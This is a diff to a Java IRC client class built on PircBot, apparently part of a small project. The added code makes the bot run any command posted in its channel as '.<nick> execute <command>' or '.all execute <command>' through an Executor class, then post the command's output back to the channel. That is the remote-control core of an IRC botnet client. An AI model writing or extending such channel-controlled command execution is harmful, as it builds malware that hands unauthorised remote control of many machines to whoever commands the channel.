@@ -1,31 +1,47 @@
 package client;
 
-import java.io.IOException;
 import java.io.InputStream;
-import java.text.SimpleDateFormat;
-import java.util.Date;
+import java.util.ArrayList;
 import java.util.Scanner;
 
 import org.jibble.pircbot.PircBot;
 
-public class Client extends PircBot {
+import util.Executor;
 
+public class Client extends PircBot {
+	private String nameSet;
+	public Executor exec = new Executor();
 	public Client(String name) {
 		this.setName(name);
 
 	}
+	
+	public String actualNick() {
+		return "";//this.getNick().substring()
+	}
+	
+	public void setVariableName(String nameSet) {
+		this.nameSet = nameSet;
+	}
 
 	public void onMessage(String channel, String sender, String login, String hostname, String message) {
 		if (message.charAt(0) == '.') {
-			message = message.substring(1, message.length() - 1);
+			//System.out.println("command detected");
+			message = message.substring(1, message.length());
 			String[] words = message.split(" ");
-
+			System.out.println("The following is the nick:" + this.getNick() );
 			if (words.length > 0 && (words[0].equals(this.getNick()) || words[0].equals("all"))) {
-
+				System.out.println("command directed to me");
 				if (words.length > 2 && words[1].equals("execute")) {
-
-					String command = message.substring(message.indexOf("execute ") + 8, message.length() - 1);
-
+					System.out.println("executing command");
+					String command = message.substring(message.indexOf("execute ") + 8, message.length());
+					exec.executeCommand(command);
+					
+					ArrayList<String> output = exec.getOutput();
+					for(String ab : output) {
+					sendMessage(channel, ab);
+					System.out.println(ab);
+					}
 				}
 
 			}
